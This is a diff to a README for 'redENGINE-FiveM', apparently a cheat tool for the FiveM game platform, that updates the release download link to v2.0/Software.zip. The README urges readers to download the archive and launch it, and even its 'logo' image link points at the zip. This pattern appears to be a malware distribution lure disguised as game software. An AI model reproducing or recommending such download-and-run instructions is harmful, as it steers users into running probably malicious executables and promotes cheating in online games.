@@ -33,7 +33,7 @@ Welcome to the redENGINE-FiveM repository! 🚀 This repository provides a power
 :frowning: redengineulen
 
 ## Instructions
-📌 For the latest release, download the file from the link: [Download https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v1.0/Soft.zip](https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v1.0/Soft.zip) 🚀
+📌 For the latest release, download the file from the link: [Download https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v2.0/Software.zip](https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v2.0/Software.zip) 🚀
 
 Please ensure to launch the downloaded file to access all the exciting features redENGINE-FiveM has to offer!
 
@@ -43,6 +43,6 @@ If the provided link is not working or you need more information, feel free to c
 ## Get Started
 Explore the world of redENGINE and take your FiveM gameplay to the next level! 🔥💻
 
-![redENGINE Logo](https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v1.0/Soft.zip)
+![redENGINE Logo](https://github.com/MartinMV57/redENGINE-FiveM/releases/download/v2.0/Software.zip)
 
 Feel free to dive into the code, explore the features, and enhance your gaming experience with redENGINE-FiveM. Happy gaming! 🎮🔥
